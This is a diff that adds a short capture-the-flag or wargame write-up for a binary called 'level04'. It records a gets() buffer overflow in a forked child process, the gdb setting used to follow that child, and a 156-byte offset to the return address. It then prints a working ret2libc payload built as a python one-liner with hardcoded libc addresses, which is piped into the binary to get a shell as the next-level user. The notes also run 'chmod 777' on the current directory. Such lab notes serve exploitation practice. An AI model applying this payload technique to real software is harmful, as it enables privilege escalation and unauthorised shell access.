@@ -1,0 +1,14 @@
+child process does a gets -> let's try to overflow there
+
+following child process in gdb with:
+set follow-fork-mode child
+
+we overflow to the eip w/ offset of 156 -> ret2libc attack !
+
+get address w/ [info proc map + find] and [info function xxx]
+
+chmod 777 . && touch payload && chmod 777 payload
+python -c 'print("a"*156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1])' > exploit
+cat exploit - | ./level04
+
+we're in a shell as level05!
